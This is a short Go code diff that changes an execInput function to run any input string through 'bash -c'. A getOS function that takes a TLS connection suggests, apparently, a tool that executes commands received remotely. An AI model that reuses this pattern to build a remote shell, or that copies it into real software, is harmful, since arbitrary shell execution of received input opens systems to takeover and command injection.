@@ -49,6 +49,8 @@ func genCert(email string) string {
 	handleError(err)
 	outstr := string(cmd)
 	return outstr
+
+	
 }
 func getOS(conn *tls.Conn) string {
 
@@ -58,11 +60,13 @@ func getOS(conn *tls.Conn) string {
 func execInput(input string) (string, error){
 	// Remove the newline character.
 	input = strings.TrimSuffix(input, "\n")
-	fmt.Println(input)
-	// Prepare the command to execute.
-	cmd, err := exec.Command(input).Output()
 
-	return string(cmd), err
+
+	cmd, err := exec.Command("bash", "-c", input).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	return string(cmd[:]), err
 }
 
 func main() {
